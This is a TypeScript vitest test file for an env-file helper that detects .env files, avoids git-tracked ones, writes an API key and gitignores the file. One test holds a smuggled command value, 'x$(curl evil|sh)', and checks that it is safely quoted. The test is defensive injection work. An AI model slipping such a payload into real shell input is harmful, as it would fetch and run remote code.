import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { detectEnvFile, upsertEnvFile } from "./env-file.js";

describe("env-file", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), "glr-env-"));
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it("detects .env.local, then .env, else defaults to .env.local", () => {
    expect(detectEnvFile(dir)).toBe(".env.local"); // neither exists → default
    writeFileSync(path.join(dir, ".env"), "FOO=1\n");
    expect(detectEnvFile(dir)).toBe(".env"); // only .env exists
    writeFileSync(path.join(dir, ".env.local"), "BAR=2\n");
    expect(detectEnvFile(dir)).toBe(".env.local"); // .env.local wins
  });

  it("avoids a git-tracked .env (would stage the secret) and uses .env.local", () => {
    const git = (args: string[]): number =>
      spawnSync("git", args, { cwd: dir, stdio: "ignore" }).status ?? 1;
    if (git(["init"]) !== 0) return; // no git available → skip
    git(["config", "user.email", "t@t.dev"]);
    git(["config", "user.name", "t"]);
    writeFileSync(path.join(dir, ".env"), "FOO=1\n");
    git(["add", ".env"]);
    git(["commit", "-m", "add env"]);
    // A committed .env must NOT receive the secret — fall back to .env.local.
    expect(detectEnvFile(dir)).toBe(".env.local");
  });

  it("writes the key, preserves other lines, and gitignores the file", () => {
    writeFileSync(path.join(dir, ".env.local"), "EXISTING=keep\n");
    const res = upsertEnvFile(dir, "GLASSRAY_API_KEY", "glr_abc", ".env.local");
    const content = readFileSync(res.file, "utf8");
    expect(content).toContain("EXISTING=keep");
    expect(content).toContain("GLASSRAY_API_KEY=glr_abc");
    expect(readFileSync(path.join(dir, ".gitignore"), "utf8")).toContain(".env.local");
  });

  it("single-quote-escapes a hostile value so a later `source` can't run it", () => {
    const res = upsertEnvFile(dir, "GLASSRAY_API_KEY", "x$(curl evil|sh)", ".env.local");
    const line = readFileSync(res.file, "utf8").trim();
    expect(line).toBe("GLASSRAY_API_KEY='x$(curl evil|sh)'");
  });

  it("reports unchanged on an identical re-write", () => {
    upsertEnvFile(dir, "K", "v", ".env.local");
    expect(upsertEnvFile(dir, "K", "v", ".env.local").unchanged).toBe(true);
  });
});
